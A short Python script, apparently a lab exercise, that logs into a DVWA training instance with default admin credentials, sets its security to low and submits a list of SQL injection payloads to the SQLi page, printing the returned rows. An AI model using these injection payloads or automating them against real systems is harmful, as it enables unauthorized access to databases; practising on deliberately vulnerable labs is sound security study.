#!/usr/bin/python
#TODO: Refatctor to pass br to indivudal functions
#TODO: Accept arguments for target URL and query strings

from bs4 import BeautifulSoup
import mechanize

queries = [r"1", r"%' OR '1'='1", r"; SHOW tables", r"a' OR 1=1"]

br = mechanize.Browser()
br.open("http://10.60.60.12/dvwa/login.php")

#Login
#Only one form available
br.select_form(nr=0)
br.form['username'] = 'admin'
br.form['password'] = 'password'
print(br.submit())

#Adjust Security Level
#http://10.60.60.12/dvwa/security.php
#security = low
#Example: https://www.pythonforbeginners.com/cheatsheet/python-mechanize-cheat-sheet
br.open("http://10.60.60.12/dvwa/security.php")
br.select_form(nr=0)
br.form.find_control(name="security").value = ["low"]
print(br.submit())

#SQL Injection Page
#http://10.60.60.12/dvwa/vulnerabilities/sqli/

#Iterate through queries and parse results
for query in queries:
    br.open("http://10.60.60.12/dvwa/vulnerabilities/sqli/")
    br.select_form(nr=0)
    print("Trying %s...\n"%query)
    br.form['id']=query
    br.submit()
    resp=br.response().read()
    
    #Parse response
    bs = BeautifulSoup(resp, "lxml")
    vulnarea=bs.find_all('div', {'class': 'vulnerable_code_area'})
    if vulnarea:
        #Print entries for results
        users = vulnarea[0].find_all('pre')
        for user in users:
            print(user)
    else:
        #No user results, so print html response
        print(resp)


